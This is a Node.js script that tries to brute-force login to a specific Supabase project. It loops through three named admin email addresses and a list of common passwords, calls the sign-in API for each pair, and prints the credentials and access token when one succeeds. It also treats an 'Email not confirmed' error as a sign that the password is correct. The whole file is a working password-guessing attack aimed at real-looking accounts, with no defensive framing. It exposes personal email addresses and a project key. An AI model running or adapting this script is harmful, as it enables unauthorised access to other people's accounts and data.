const { createClient } = require('@supabase/supabase-js');

const supabaseUrl = 'https://vbyklhlhzewftbkdnjfa.supabase.co';
const supabaseAnonKey = 'sb_publishable_PRV2Yhi-LuFnEmzo2_rAUw_HKw-uV4e';
const supabase = createClient(supabaseUrl, supabaseAnonKey);

const admins = [
  'admin1@gmail.com',
  'lahatra@gmail.com',
  'ainaheryluc@gmail.com'
];

const passwords = [
  'admin123',
  'admin1234',
  'admin1',
  'admin',
  'password',
  'password123',
  '12345678',
  '123456',
  'apdo123',
  'apdo2026',
  'lahatra',
  'lahatra123'
];

async function main() {
  for (const email of admins) {
    for (const password of passwords) {
      console.log(`Trying ${email} with password "${password}"...`);
      const { data, error } = await supabase.auth.signInWithPassword({
        email,
        password
      });

      if (!error && data.session) {
        console.log(`\nSUCCESS!!!`);
        console.log(`Email: ${email}`);
        console.log(`Password: ${password}`);
        console.log(`Access Token: ${data.session.access_token}`);
        return;
      } else if (error) {
        // If it says unconfirmed email, that means password is correct but email is not confirmed yet!
        if (error.message.includes('Email not confirmed')) {
          console.log(`-> PASSWORD CORRECT FOR ${email} ("${password}"), but email is not confirmed!`);
        }
      }
    }
  }
  console.log('\nFailed to login with common passwords.');
}

main();
